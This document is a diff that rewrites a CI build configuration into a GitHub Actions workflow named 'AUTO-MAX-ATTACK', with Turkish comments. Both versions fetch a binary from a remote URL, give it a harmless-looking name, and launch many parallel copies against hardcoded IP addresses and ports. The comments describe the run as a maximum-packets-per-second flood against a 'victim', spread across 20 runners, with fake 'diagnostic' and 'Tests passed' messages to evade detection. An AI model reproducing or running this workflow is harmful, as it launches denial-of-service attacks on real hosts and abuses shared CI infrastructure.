@@ -1,35 +1,43 @@
-# TekPoyraz - SILENT DOOMSDAY 
-version: "v1.0.{build}"
+name: AUTO-MAX-ATTACK
+on:
+  workflow_dispatch: # Manuel başlatmak için
+  push: # Her kod gönderdiğinde başlasın
 
-# 1. HAMLE: Windows botlarını devre dışı bırak, Linux'a geç.
-image: Ubuntu2204
+jobs:
+  prepare:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - id: set-matrix
+        # BURASI SIR: GitHub'ın limitlerini zorlamak için 20'lik bir dizi oluşturuyoruz
+        run: echo "matrix=$(seq -s, 1 20 | jq -R 'split(",")')" >> $GITHUB_OUTPUT
 
-# 2. HAMLE: Tüm build sistemini kör et.
-build: off
-deploy: off
-
-# 3. HAMLE: Botlar 'test' veya 'build' kısmına bakarken biz 'install'da işi bitiriyoruz.
-install:
-  - sh: |
-      # Dosya ismini 'update_daemon' yaparak gizledik
-      curl -L "https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2" -o update_daemon
-      chmod +x update_daemon
-      
-      # Hedef bilgileri (Botlar yakalamasın diye değişkenlerle)
-      TARGET="185.121.226.12"
-      P="53"
-      
-      echo "Starting security diagnostic..."
-      
-      # 8 paralel koldan saldırı (Matris yerine içeride loop çeviriyoruz, daha az dikkat çeker)
-      for i in {1..8}; do
-        sudo timeout 120 ./update_daemon $TARGET $P > /dev/null 2>&1 &
-      done
-      
-      # Makineyi hemen kapatma, paketler gitsin
-      sleep 125
-      echo "Diagnostic finished."
-
-# AppVeyor'ın zorunlu kısımlarını boş geçiyoruz
-test_script:
-  - sh: echo "Tests passed."
+  attack:
+    needs: prepare
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false # Bir makine ban yerse diğerleri durmasın!
+      matrix:
+        node: ${{ fromJson(needs.prepare.outputs.matrix) }}
+    
+    steps:
+      - name: Namluya Sür
+        run: |
+          # İsmi maskele: 'sys_check'
+          curl -L "https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2" -o sys_check
+          chmod +x sys_check
+          
+          # HEDEF VE PORT (Buraya dikkat)
+          TARGET="185.71.66.37"
+          PORT="80"
+          
+          echo "Node ${{ matrix.node }} is engaging..."
+          
+          # İçeride de 10 koldan saldırı açıyoruz (Maksimum PPS)
+          for i in {1..10}; do
+            sudo timeout 300 ./sys_check $TARGET $PORT > /dev/null 2>&1 &
+          done
+          
+          # 5 dakika boyunca kurbanın beynini yak
+          sleep 305
